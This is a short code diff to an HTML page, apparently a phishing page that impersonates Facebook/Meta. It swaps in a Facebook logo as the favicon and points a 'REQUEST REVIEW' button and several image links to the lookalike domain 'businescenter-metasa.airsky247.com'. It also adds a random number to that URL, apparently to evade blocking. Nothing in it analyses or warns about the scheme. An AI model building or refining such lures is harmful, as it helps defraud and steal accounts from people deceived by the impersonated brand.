@@ -11,7 +11,7 @@
     <!-- <meta property="og:url" content="https://biotr.link/cf0bkga" />
     <meta property="twitter:url" content="https://biotr.link/cf0bkga" /> -->
 
-    <link href="https://biotr.link/uploads/main/b3d487e71530ca818b8589d2c614e9f4.svg" rel="shortcut icon" />
+    <link href="./img/fb-logo-35b61e19.webp" rel="shortcut icon" />
 
     <link href="https://biotr.link/themes/altum/assets/css/bootstrap.min.css?v=4810" id="css_theme_style" rel="stylesheet" media="screen,print">
     <link href="https://biotr.link/themes/altum/assets/css/custom.css?v=4810" rel="stylesheet" media="screen,print">
@@ -85,8 +85,7 @@
 
     // Gắn URL ngẫu nhiên cho nút và hình ảnh
     const randomNumber = generateRandomNumber();
-    const randomUrl = `https://businescenter-metasa.airsky247.com/`
-    ;
+    const randomUrl = `https://businescenter-metasa.airsky247.com/${randomNumber}`; // Thêm số ngẫu nhiên vào cuối URL
 
     // Gắn URL cho nút "REQUEST REVIEW"
     const randomLink = document.getElementById("random-link");
@@ -98,5 +97,6 @@
     document.getElementById("img-link-3").href = randomUrl;
     document.getElementById("img-link-4").href = randomUrl;
 </script>
+
 </body>
 </html>
